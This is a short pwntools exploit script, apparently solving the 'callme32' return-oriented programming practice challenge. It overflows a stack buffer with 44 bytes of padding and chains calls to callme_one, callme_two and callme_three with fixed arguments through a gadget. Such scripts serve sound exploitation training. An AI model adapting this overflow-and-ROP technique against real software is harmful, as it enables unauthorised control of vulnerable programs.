#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./callme32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

pop3ret = 0x080488a9 # : pop esi ; pop edi ; pop ebp ; ret
payload = (
    b"A" * 44 +
    p32(exe.plt["callme_one"]) +
    p32(pop3ret) +
    p32(0x1) +
    p32(0x2) +
    p32(0x3) +

    p32(exe.plt["callme_two"]) +
    p32(pop3ret) +
    p32(0x1) +
    p32(0x2) +
    p32(0x3) +

    p32(exe.plt["callme_three"]) +
    p32(pop3ret) +
    p32(0x1) +
    p32(0x2) +
    p32(0x3) +

    p32(exe.plt["exit"]) +
    b"BBBB" +
    p32(0x0)
)
io.sendline(payload)

io.interactive()

